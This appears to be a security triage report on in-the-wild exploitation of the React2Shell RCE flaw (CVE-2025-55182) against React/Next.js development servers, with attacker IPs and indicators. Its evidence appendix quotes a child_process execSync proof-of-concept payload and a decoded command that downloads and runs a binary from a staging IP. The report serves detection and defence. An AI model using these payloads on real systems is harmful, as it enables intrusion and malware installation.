# Zero-Day Candidate Triage Report

### 1. Investigation Scope
- **investigation_start:** 2026-02-25T22:00:09Z
- **investigation_end:** 2026-02-25T22:30:10Z
- **completion_status:** Partial (degraded evidence)
  - *Note: The primary investigation was successful due to a pivot to raw log analysis. However, multiple aggregation and search queries failed, indicating potential backend data indexing or tool issues. This prevented automated correlation and required manual inspection.*

### 2. Candidate Discovery Summary
In the last 30 minutes, 1,611 total attacks were observed. The primary area of interest was a cluster of 11 "Web Application Attack" events targeting non-standard HTTP ports (3000-3009). These events were associated with alerts for a highly unusual CVE, `CVE-2025-55182`. Secondary activity included commodity SSH/VNC scanning and a cluster of traffic on port 9093 that was not investigated due to the priority of the primary threat.

### 3. Emerging n-day Exploitation
- **candidate_id:** CAND-20260225-1
- **vulnerability:** React/Next.js Server Components RCE (React2Shell)
- **cve:** CVE-2025-55182
- **signature:** `ET WEB_SPECIFIC_APPS React Server Components React2Shell Unsafe Flight Protocol Property Access (CVE-2025-55182)`
- **key_evidence:**
    - Observed 11 exploit attempts targeting React/Next.js development servers on ports 3000-3009.
    - Payloads confirm Remote Code Execution (RCE) via prototype pollution.
    - Two distinct variations were observed: one performing a simple command to validate the vulnerability, and another deploying a malware downloader.
- **assessment:** This is a high-confidence, active in-the-wild exploitation of a very recent, critical vulnerability. Attackers have fully operationalized the exploit to deliver malware. This activity represents a high-priority threat.

### 4. Known-Exploit Exclusions
- **SSH Scanning & Brute-Force:** Standard, high-volume commodity noise targeting port 22.
- **VNC Scanning:** Standard scanning noise targeting ports 5902/5905.
- **TCP Stream/Packet Anomalies:** Network-level noise not indicative of a specific application-layer exploit.

### 5. Novel Exploit Candidates
No unmapped, novel exploit candidates were validated in this window.

### 6. Suspicious Unmapped Activity to Monitor
- **activity_description:** Unusual port activity on port 9093
- **observed_evidence:** 58 events from US-based IPs.
- **reason_for_monitoring:** This port received significant attention but was not investigated further due to the higher priority of the React2Shell exploit. It should be monitored in the next window for any escalation.

### 7. Infrastructure & Behavioral Classification
- **CAND-20260225-1 (React2Shell Exploitation):**
    - **Infrastructure:**
        - Attacker IPs: `107.170.43.160` (ASN 14061, DigitalOcean, US), `176.65.139.44` (ASN 51396, Pfcloud UG, Germany).
        - Staging IP: `130.12.180.69` (for malware download).
    - **Behavioral:**
        - **Phase 1 (Scanning/Probing):** The actor at `107.170.43.160` systematically scanned ports 3000-3009, sending an RCE payload that executes a simple `echo VULN` command to confirm vulnerability.
        - **Phase 2 (Deployment):** The actor at `176.65.139.44` sent a more advanced RCE payload containing a base64-encoded command to download and execute a binary from a remote server, indicating successful operationalization of the exploit.

### 8. Analytical Assessment
The primary threat identified is the active exploitation of CVE-2025-55182 (React2Shell), a recently disclosed critical RCE vulnerability. The activity is clearly mapped to a known signature and has been corroborated with OSINT, confirming this is an emerging n-day threat, not a novel zero-day. The presence of a malware downloader payload demonstrates that threat actors have moved beyond proof-of-concept to active payload delivery.

The investigation's confidence is high for this specific finding due to the successful retrieval and analysis of raw log data. However, the overall process was degraded by the failure of multiple backend search and aggregation tools. This introduces uncertainty, as other, more subtle threats may have been missed by the failing automated analysis.

### 9. Confidence Breakdown
- **Overall Confidence:** High (Degraded)
  - *Confidence in the primary finding is high, but the backend tool failures reduce overall confidence in the completeness of the investigation.*
- **CAND-20260225-1:** High
  - *Direct evidence from raw logs containing full exploit payloads, corroborated by specific signatures and public OSINT reporting.*

### 10. Evidence Appendix

**Item: CAND-20260225-1 (CVE-2025-55182)**
- **Source IPs:**
  - `107.170.43.160` (10 events)
  - `176.65.139.44` (1 event)
- **ASNs:**
  - 14061 (DigitalOcean, LLC)
  - 51396 (Pfcloud UG (haftungsbeschrankt))
- **Target Ports/Services:**
  - 3000, 3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 3009 (HTTP)
- **Paths/Endpoints:** `/`, `/_rsc`
- **Payload/Artifact Excerpts:**
  - **PoC Payload:** `...{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo VULN').toString().trim();;throw Object.assign...`
  - **Malware Downloader (decoded from base64):** `wget http://130.12.180.69/x86_64 || curl http://130.12.180.69/x86_64 -o x86_64; chmod 777 x86_64; ./x86_64 React`
- **Staging Indicators:**
  - Malware download server: `130.12.180.69`
- **Previous-window / 24h Checks:**
  - Unavailable

### 11. Indicators of Interest
- **Attacker IP:** `107.170.43.160`
- **Attacker IP:** `176.65.139.44`
- **Malware Staging IP:** `130.12.180.69`
- **Payload Artifact:** `process.mainModule.require("child_process").execSync`
- **Malware Filename:** `x86_64`

### 12. Backend tool issues
The following tool queries failed during the investigation, requiring manual pivots and potentially limiting visibility:
- **kibanna_discover_query:** Failed to retrieve events when querying for the CVE term `alert.cve.keyword`. Suspected data format or indexing issue.
- **match_query:** A lenient follow-up query for the CVE also failed, reinforcing the likelihood of a data issue.
- **suricata_lenient_phrase_search:** Tool returned zero results when aggregating source IPs by the known-good signature phrase, contradicting raw log evidence.
- **two_level_terms_aggregated:** Tool returned empty results when attempting to aggregate source IPs by alert category, also contradicting raw log evidence.